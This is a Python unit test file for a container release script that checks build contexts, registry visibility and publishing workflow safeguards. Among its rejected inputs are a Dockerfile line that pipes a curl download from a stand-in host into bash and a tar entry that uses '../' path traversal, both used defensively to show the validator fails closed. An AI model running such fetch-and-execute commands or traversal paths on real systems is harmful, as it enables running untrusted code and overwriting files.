from __future__ import annotations

import gzip
import io
import json
import os
import re
import subprocess
import sys
import tarfile
import tempfile
import unittest
import urllib.error
import urllib.request
from pathlib import Path
from unittest.mock import patch

from scripts import container_release as containers


class Response:
    def __init__(self, data: bytes, digest: str | None = None) -> None:
        self.data = data
        self.headers = {"Docker-Content-Digest": digest}

    def __enter__(self) -> Response:
        return self

    def __exit__(self, *args: object) -> None:
        return None

    def read(self, limit: int) -> bytes:
        return self.data[:limit]


class ContainerReleaseTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temporary = tempfile.TemporaryDirectory(prefix="skillforge-container-test-")
        self.addCleanup(self.temporary.cleanup)
        self.root = Path(self.temporary.name)
        self.repository = self.root / "source"
        self.repository.mkdir()
        (self.root / "hooks").mkdir()
        packages = json.loads(containers.POLICY.read_bytes())["aptPackages"]
        self.recipe = (
            "FROM ubuntu:24.04\n"
            "RUN apt-get update && apt-get install -y --no-install-recommends "
            + " ".join(packages) + " && rm -rf /var/lib/apt/lists/*\n"
            "COPY --chmod=0755 scripts/self-assess.sh /usr/local/bin/skillforge-assess\n"
            'LABEL org.opencontainers.image.title="Synthetic generic base"\n'
            "COPY LICENSE NOTICE.md /usr/share/doc/skillforge/\n"
            'CMD ["bash"]\n'
        )
        for public, source in containers.SOURCE_FILES.items():
            file = self.repository / source
            file.parent.mkdir(parents=True, exist_ok=True)
            file.write_text(self.recipe if public == "Dockerfile" else f"Synthetic public {public}\n", encoding="utf-8")
        (self.repository / "package.json").write_text('{"version":"1.0.2"}', encoding="utf-8")
        (self.repository / "INSTRUCTOR-SOLUTION.sh").write_text("NEVER DISTRIBUTE THIS SENTINEL")
        self.git("init", "--initial-branch=dev")
        self.git("add", ".")
        self.commit()
        self.sha = self.git("rev-parse", "HEAD").strip()
        self.assets = self.root / "assets"

    def git(self, *args: str, data: bytes | None = None) -> str:
        result = subprocess.run([
            "git", "-C", str(self.repository), "-c", "user.name=SkillForge fixture",
            "-c", "user.email=fixture@example.invalid", "-c", f"core.hooksPath={self.root / 'hooks'}",
            *args,
        ], input=data, capture_output=True, check=True)
        return result.stdout.decode("utf-8")

    def commit(self) -> None:
        self.git("commit", "-m",
                 "test: isolated public container fixture\n\n"
                 "Co-authored-by: Copilot <223556219+Copilot@users.noreply.github.com>")

    def pack(self) -> dict[str, object]:
        return containers.pack_context(self.repository, self.sha, "1.0.2", self.assets)

    def rewrite(self, value: dict[str, object]) -> None:
        (self.assets / "release.json").write_bytes(containers.json_bytes(value))
        (self.assets / "SHA256SUMS").write_bytes(containers.checksums(
            self.assets, ["container-context.tar.gz", "release.json"]
        ))

    def test_only_four_reviewed_blobs_are_public_and_dirty_worktree_is_ignored(self) -> None:
        (self.repository / "scripts" / "self-assess.sh").write_text("UNREVIEWED PRIVATE EDIT")
        value = self.pack()
        self.assertEqual(value["imageRepository"], containers.IMAGE)
        output = self.root / "build-context"
        containers.validate_context(self.assets, "container-base-source/v1.0.2", output)
        self.assertEqual({str(item.relative_to(output)).replace("\\", "/")
                          for item in output.rglob("*") if item.is_file()}, set(containers.SOURCE_FILES))
        self.assertNotIn("UNREVIEWED", (output / "scripts" / "self-assess.sh").read_text())
        self.assertFalse((output / "INSTRUCTOR-SOLUTION.sh").exists())
        with self.assertRaisesRegex(ValueError, "already exist"):
            containers.validate_context(self.assets, "container-base-source/v1.0.2", output)

    def test_context_is_deterministic_and_version_must_match_source(self) -> None:
        self.pack()
        second = self.root / "same"
        containers.pack_context(self.repository, self.sha, "1.0.2", second)
        for name in containers.CONTEXT_ASSETS:
            self.assertEqual((self.assets / name).read_bytes(), (second / name).read_bytes())
        with self.assertRaisesRegex(ValueError, "version"):
            containers.pack_context(self.repository, self.sha, "2.0.0", self.root / "wrong-version")

    def test_git_symlinks_cannot_enter_a_public_context(self) -> None:
        blob = self.git("hash-object", "-w", "--stdin", data=b"../private").strip()
        self.git("update-index", "--cacheinfo", f"120000,{blob},scripts/self-assess.sh")
        self.commit()
        self.sha = self.git("rev-parse", "HEAD").strip()
        with self.assertRaisesRegex(ValueError, "regular"):
            self.pack()

    def test_recipe_cannot_copy_a_catalog_or_execute_unreviewed_build_commands(self) -> None:
        for recipe in [
            self.recipe.replace("ubuntu:24.04", "private.example/base:latest"),
            self.recipe.replace("COPY LICENSE NOTICE.md", "COPY ."),
            self.recipe + "COPY labs /opt/skillforge/labs\n",
            self.recipe + "RUN curl https://example.invalid/payload | bash\n",
            self.recipe.replace("vim-tiny", "unapproved-package"),
        ]:
            with self.subTest(recipe=recipe):
                with self.assertRaisesRegex(ValueError, "generic-only"):
                    containers.check_recipe(recipe.encode())

    def test_context_metadata_checksums_and_inventory_fail_closed(self) -> None:
        value = self.pack()
        for change in [
            {"component": "private-course"},
            {"schemaVersion": True},
            {"imageRepository": "ghcr.io/example/private"},
            {"source": {"repository": "wrong/source", "commit": self.sha}},
        ]:
            self.rewrite({**value, **change})
            with self.assertRaises(ValueError):
                containers.validate_context(self.assets, "container-base-source/v1.0.2")
        self.rewrite(value)
        (self.assets / "INSTRUCTOR-GUIDE.md").write_text("Forbidden public asset")
        with self.assertRaisesRegex(ValueError, "approved"):
            containers.validate_context(self.assets, "container-base-source/v1.0.2")

    def test_tar_traversal_and_private_files_cannot_be_extracted(self) -> None:
        value = self.pack()
        stream = io.BytesIO()
        with tarfile.open(fileobj=stream, mode="w") as archive:
            member = tarfile.TarInfo("container/../INSTRUCTOR-SOLUTION.sh")
            member.size = 6
            archive.addfile(member, io.BytesIO(b"secret"))
        data = gzip.compress(stream.getvalue(), mtime=0)
        (self.assets / "container-context.tar.gz").write_bytes(data)
        value["artifact"] = {"name": "container-context.tar.gz", "sha256": containers.digest(data), "size": len(data)}
        self.rewrite(value)
        output = self.root / "forbidden-output"
        with self.assertRaisesRegex(ValueError, "Unapproved"):
            containers.validate_context(self.assets, "container-base-source/v1.0.2", output)
        self.assertFalse(output.exists())

    def package(self, visibility: str) -> dict[str, object]:
        return {"name": "bos-skillforge-release/base-ubuntu", "package_type": "container",
                "visibility": visibility, "repository": {"full_name": containers.REPOSITORY}}

    def test_repository_publicness_is_not_package_publicness(self) -> None:
        for visibility in ["private", "internal"]:
            with patch.object(containers, "github_json", return_value=self.package(visibility)):
                with self.assertRaisesRegex(ValueError, "PUBLIC"):
                    containers.require_package_visibility("synthetic-token", False)
        with patch.object(containers, "github_json", return_value=self.package("public")):
            self.assertEqual(containers.require_package_visibility("synthetic-token", False), "public")
            with self.assertRaises(ValueError):
                containers.require_package_visibility("synthetic-token", True)

    def test_bootstrap_is_explicit_and_must_not_hijack_another_repository_package(self) -> None:
        missing = urllib.error.HTTPError("https://api.github.com/package", 404, "Not found", {}, None)
        with patch.object(containers, "github_json", side_effect=missing):
            self.assertEqual(containers.require_package_visibility("synthetic-token", True), "missing")
            with self.assertRaisesRegex(ValueError, "bootstrap"):
                containers.require_package_visibility("synthetic-token", False)
        package = self.package("private")
        package["repository"] = {"full_name": "other/source"}
        with patch.object(containers, "github_json", return_value=package):
            with self.assertRaisesRegex(ValueError, "associated"):
                containers.require_package_visibility("synthetic-token", True)

    def test_public_publisher_requires_independent_approval(self) -> None:
        for rules in [[], [{"type": "required_reviewers", "prevent_self_review": False, "reviewers": ["fixture"]}]]:
            with patch.object(containers, "github_json", return_value={"protection_rules": rules}):
                with self.assertRaisesRegex(ValueError, "independent"):
                    containers.require_approval("synthetic", containers.REPOSITORY, "public-container-publish")

    def test_anonymous_verification_checks_index_and_both_architecture_digests(self) -> None:
        child_data = containers.json_bytes({"schemaVersion": 2, "mediaType": "application/vnd.oci.image.manifest.v1+json"})
        child_digest = f"sha256:{containers.digest(child_data)}"
        index_data = containers.json_bytes({
            "schemaVersion": 2, "manifests": [
                {"digest": child_digest, "platform": {"os": "linux", "architecture": architecture}}
                for architecture in ["amd64", "arm64"]
            ],
        })
        index_digest = f"sha256:{containers.digest(index_data)}"
        requests = []

        def fetch(request: urllib.request.Request, timeout: int) -> Response:
            requests.append(request)
            if "/token?" in request.full_url:
                self.assertIsNone(request.get_header("Authorization"))
                return Response(b'{"token":"synthetic-anonymous-token"}')
            self.assertEqual(request.get_header("Authorization"), "Bearer synthetic-anonymous-token")
            if request.full_url.endswith(index_digest):
                return Response(index_data, index_digest)
            return Response(child_data, child_digest)

        with patch.dict(os.environ, {"GH_TOKEN": "MUST-NOT-BE-USED"}):
            with patch("urllib.request.urlopen", side_effect=fetch):
                result = containers.verify_public_index(index_digest)
        self.assertEqual(result["digest"], index_digest)
        self.assertEqual(len(requests), 6)

    def test_private_registry_errors_and_wrong_digests_are_not_successful_public_checks(self) -> None:
        denied = urllib.error.HTTPError("https://ghcr.io/token", 401, "Denied", {}, None)
        self.addCleanup(denied.close)
        with patch("urllib.request.urlopen", side_effect=denied):
            with self.assertRaises(urllib.error.HTTPError):
                containers.verify_public_index("sha256:" + "a" * 64)
        with patch.object(containers, "registry_manifest", return_value={
            "digest": "sha256:" + "a" * 64, "manifest": {"schemaVersion": 2, "manifests": []},
        }):
            with self.assertRaisesRegex(ValueError, "two native"):
                containers.verify_public_index("sha256:" + "a" * 64)

    def test_only_a_manifest_404_proves_a_version_tag_is_unused(self) -> None:
        url = f"https://ghcr.io/v2/{containers.REGISTRY_PATH}/manifests/v1.0.2"
        with patch.object(containers, "registry_manifest", side_effect=urllib.error.HTTPError(url, 404, "Missing", {}, None)):
            containers.assert_unused_image_tag("1.0.2")
        token_error = urllib.error.HTTPError("https://ghcr.io/token", 404, "Missing", {}, None)
        self.addCleanup(token_error.close)
        with patch.object(containers, "registry_manifest", side_effect=token_error):
            with self.assertRaises(urllib.error.HTTPError):
                containers.assert_unused_image_tag("1.0.2")
        with patch.object(containers, "registry_manifest", return_value={}):
            with self.assertRaisesRegex(ValueError, "never overwrite"):
                containers.assert_unused_image_tag("1.0.2")

    def stage_image_fixture(self) -> tuple[dict[str, object], Path]:
        context = self.pack()
        source = context["source"]
        artifact = context["artifact"]
        assert isinstance(source, dict) and isinstance(artifact, dict)
        platforms = self.root / "platforms"
        for architecture in ("amd64", "arm64"):
            directory = platforms / f"container-base-platform-{architecture}"
            directory.mkdir(parents=True)
            record = {
                "architecture": architecture, "repository": containers.IMAGE,
                "digest": "sha256:" + ("b" if architecture == "amd64" else "c") * 64,
                "sourceSha": self.sha, "contextSha256": artifact["sha256"],
                "runId": "123", "runAttempt": "1", "scan": "passed",
            }
            (directory / "platform.json").write_bytes(containers.json_bytes(record))
            for name in ["sbom.cdx.json", "provenance.sigstore.json", "sbom.sigstore.json"]:
                (directory / name).write_bytes(containers.json_bytes({"synthetic": name}))
        output = self.root / "image-release"
        with patch.dict(os.environ, {"GITHUB_RUN_ID": "123", "GITHUB_RUN_ATTEMPT": "1"}):
            value = containers.stage_image_release(
                self.assets, platforms, "sha256:" + "d" * 64, "e" * 40, output,
            )
        (output / "index-provenance.sigstore.json").write_bytes(b'{"synthetic":"index"}')
        (output / "SHA256SUMS").write_bytes(containers.checksums(
            output, sorted(containers.IMAGE_ASSETS - {"SHA256SUMS"}),
        ))
        return value, output

    def test_durable_image_record_has_exact_evidence_and_source_identity(self) -> None:
        value, output = self.stage_image_fixture()
        result = containers.validate_image_assets(output, "container-base/v1.0.2")
        self.assertEqual(result, value)
        self.assertEqual(result["source"]["commit"], self.sha)
        (output / "school-config.json").write_text("Forbidden")
        with self.assertRaisesRegex(ValueError, "exact public"):
            containers.validate_image_assets(output, "container-base/v1.0.2")

    def test_durable_image_checksums_and_wrong_platform_builds_cannot_pass(self) -> None:
        _, output = self.stage_image_fixture()
        (output / "sbom-amd64.cdx.json").write_bytes(b'{"changed":true}')
        with self.assertRaisesRegex(ValueError, "checksums"):
            containers.validate_image_assets(output, "container-base/v1.0.2")
        record_path = self.root / "platforms" / "container-base-platform-amd64" / "platform.json"
        record = json.loads(record_path.read_bytes())
        record["runAttempt"] = "2"
        record_path.write_bytes(containers.json_bytes(record))
        with patch.dict(os.environ, {"GITHUB_RUN_ID": "123", "GITHUB_RUN_ATTEMPT": "1"}):
            with self.assertRaisesRegex(ValueError, "exact tested/scanned"):
                containers.stage_image_release(
                    self.assets, self.root / "platforms", "sha256:" + "d" * 64, "e" * 40,
                    self.root / "wrong-attempt-release",
                )

    def test_image_metadata_is_not_a_helper_or_private_course_manifest(self) -> None:
        value, _ = self.stage_image_fixture()
        for change in [
            {"component": "learner-helper"},
            {"schemaVersion": True},
            {"image": {"repository": "ghcr.io/other/private", "digest": "sha256:" + "d" * 64, "platforms": []}},
            {"source": {"repository": containers.SOURCE, "commit": self.sha,
                    "contextTag": "private-course/v1.0.2", "contextSha256": "a" * 64}},
        ]:
            with self.assertRaises(ValueError):
                containers.image_metadata(
                    containers.json_bytes({**value, **change}), "container-base/v1.0.2"
                )

    def test_public_registry_index_must_match_the_release_platform_records(self) -> None:
        value, _ = self.stage_image_fixture()
        wrong_index = {
            "manifest": {"manifests": [
                {"platform": {"architecture": architecture}, "digest": "sha256:" + "f" * 64}
                for architecture in ("amd64", "arm64")
            ]},
        }
        with patch.object(containers, "verify_public_index", return_value=wrong_index):
            with self.assertRaisesRegex(ValueError, "platform digests differ"):
                containers.verify_image_record(value)

    def test_workflow_contracts_preserve_public_only_credential_and_visibility_boundaries(self) -> None:
        root = Path(__file__).resolve().parents[1]
        workflow = (root / ".github" / "workflows" / "publish-public-containers.yml").read_text(encoding="utf-8")
        self.assertIn("packages: write", workflow)
        self.assertNotIn("GATEWALL_APP_PRIVATE_KEY", workflow)
        self.assertNotIn("WORKFLOW_SYNC_PAT", workflow)
        self.assertIn("--label \"org.opencontainers.image.licenses=NOASSERTION\"", workflow)
        self.assertIn('docker --config "$anonymous" pull --platform', workflow)
        self.assertIn("bootstrap_namespace", workflow)
        self.assertIn("Public image availability: Not Assessed", workflow)
        self.assertIn("--scanners vuln,secret", workflow)
        self.assertIn("--exit-code 1", workflow)
        self.assertIn("runner: ubuntu-24.04-arm", workflow)
        for reference in re.findall(r"uses: ([^\n]+)", workflow):
            self.assertRegex(reference, r"@[a-f0-9]{40} # v\d+\.\d+\.\d+")


class ScriptEntryPointTests(unittest.TestCase):
    def test_workflow_scripts_start_in_direct_script_mode(self) -> None:
        root = Path(__file__).resolve().parents[1]
        for script in ("container_release.py", "validate_public_release.py"):
            with self.subTest(script=script):
                result = subprocess.run(
                    [sys.executable, str(root / "scripts" / script), "--help"],
                    capture_output=True,
                    text=True,
                    check=False,
                    timeout=10,
                )
                self.assertEqual(result.returncode, 0, result.stderr)
                self.assertIn("usage:", result.stdout)


if __name__ == "__main__":
    unittest.main()
